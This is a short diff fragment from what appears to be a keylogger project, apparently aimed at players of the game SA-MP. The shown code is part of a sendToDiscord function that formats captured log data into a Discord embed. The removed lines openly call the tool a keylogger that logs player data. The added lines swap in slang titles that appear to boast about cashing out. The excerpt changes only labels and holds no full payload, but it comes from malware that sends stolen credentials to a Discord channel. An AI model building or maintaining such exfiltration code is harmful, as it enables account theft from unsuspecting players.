@@ -147,8 +147,8 @@ async function sendToDiscord(log) {
 
     const embedData = {
     embeds: [{
-        title: '🔒 LOG DATA PLAYER',
-        description: '**IRSAN SAMP KEYLOGGER**\n© 2026 IRSAN SAMP',
+        title: 'PAKET WOII!!',
+        description: '**CAIRR💸 njir',
         color: 16776960,
         footer: {
             text: `ID: ${log.id} | Supabase + Vercel`
